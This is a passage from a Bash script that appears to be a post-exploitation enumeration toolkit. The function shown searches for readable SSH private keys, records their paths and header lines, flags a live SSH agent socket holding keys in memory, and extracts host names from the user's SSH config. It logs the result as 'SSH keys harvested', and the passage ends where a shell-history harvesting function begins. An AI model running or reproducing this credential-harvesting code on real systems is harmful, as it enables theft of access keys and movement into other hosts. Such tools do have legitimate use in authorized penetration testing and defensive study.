    for kp in "${key_paths[@]}"; do
        [ -f "$kp" ] && [ -r "$kp" ] && {
            local key_head=$(head -1 "$kp" 2>/dev/null)
            echo "SSH KEY: $kp ($key_head)" >> "$SESSION/bt/ssh_keys.txt"
        }
        [ -d "$kp" ] && find "$kp" -name "id_*" -type f 2>/dev/null | while read f; do
            [ -r "$f" ] && echo "SSH KEY: $f" >> "$SESSION/bt/ssh_keys.txt"
        done
    done
    # Check for agent forwarding keys
    [ -S "${SSH_AUTH_SOCK}" ] 2>/dev/null && echo "SSH agent socket: $SSH_AUTH_SOCK — keys in memory" >> "$SESSION/bt/ssh_keys.txt"
    # Check ssh config for interesting hosts
    [ -f "$HOME/.ssh/config" ] && grep -oE "Host [^ ]+" "$HOME/.ssh/config" 2>/dev/null | head -10 >> "$SESSION/bt/ssh_keys.txt"
    [ -s "$SESSION/bt/ssh_keys.txt" ] && bt "SSH keys harvested"
}

bt_44_history_harvest() {
